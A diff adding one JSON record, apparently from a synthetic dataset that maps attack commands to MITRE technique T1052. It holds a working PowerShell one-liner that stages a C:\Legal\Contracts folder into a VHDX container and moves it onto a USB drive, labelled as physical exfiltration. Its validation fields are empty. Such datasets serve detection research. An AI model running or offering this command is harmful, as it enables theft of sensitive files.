@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $vhd=Join-Path $env:TEMP 'work.vhdx'; Mount-DiskImage -ImagePath $vhd -PassThru | Out-Null; $dl=((Get-DiskImage -ImagePath $vhd | Get-Disk | Get-Partition | Get-Volume)[0].DriveLetter); Copy-Item 'C:\\Legal\\Contracts' -Destination \"$($dl):\\C\" -Recurse -Force; Dismount-DiskImage -ImagePath $vhd; Move-Item $vhd (Join-Path $usb 'work.vhdx') -Force",
+  "explanation": "Stages data into a locally mounted VHDX, then moves the container onto the USB to minimize file I/O on the removable volume.",
+  "rationale_steps": [
+    "Mount local VHDX container",
+    "Copy sensitive files into container",
+    "Dismount to flush changes",
+    "Move VHDX onto the USB device for physical exfiltration"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-ad4e6ef4",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
